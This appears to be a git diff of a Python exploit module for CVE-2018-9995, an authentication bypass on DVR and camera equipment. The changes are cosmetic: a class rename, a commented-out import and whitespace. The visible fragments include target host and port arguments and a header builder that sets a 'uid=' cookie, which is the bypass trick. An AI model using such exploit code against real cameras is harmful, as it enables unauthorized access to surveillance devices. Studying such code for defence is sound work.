@@ -1,5 +1,4 @@
-# -*- coding: utf-8 -*
-class C2018_9995_EXP(object):
+class cve_2018_9995(object):
     def __init__(self) -> None:
         super().__init__()
         self.details='''
@@ -31,10 +30,13 @@ the camera equipments which could be attack:
         self.argumens=[  [1,"hst","目标"],
                     [1,"port","端口"]
                 ]
+        
 # -*- coding: utf-8 -*-
-from __future__ import print_function
+#from __future__ import print_function
 import json
 import requests
+
+
 class Colors:
     BLUE        = '\033[94m'
     GREEN       = '\033[32m'
@@ -125,8 +127,3 @@ class exp:
         self.headers["Cookie"]           = "uid="+xCookie
 
         return self.headers
-
-   
-   
-   
-   
